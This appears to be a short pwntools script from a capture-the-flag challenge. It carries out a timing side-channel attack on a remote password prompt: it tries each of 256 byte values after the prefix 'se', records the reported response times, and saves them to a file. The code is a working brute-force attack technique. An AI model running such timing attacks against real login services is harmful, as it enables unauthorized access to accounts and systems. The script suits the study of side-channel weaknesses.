from pwn import * 

lines = []

for i in range(256): 
    io = remote('20.244.33.146', 4445)

    io.recvuntil('password: ')
    io.sendline('se' + chr(i))
    io.recvuntil("taken:  ")
    time_taken = io.recv().decode()
    
    lines.append(f'{chr(i)} : {time_taken}')
    io.close()

with open('response.txt', 'w') as file: 
    file.writelines(lines)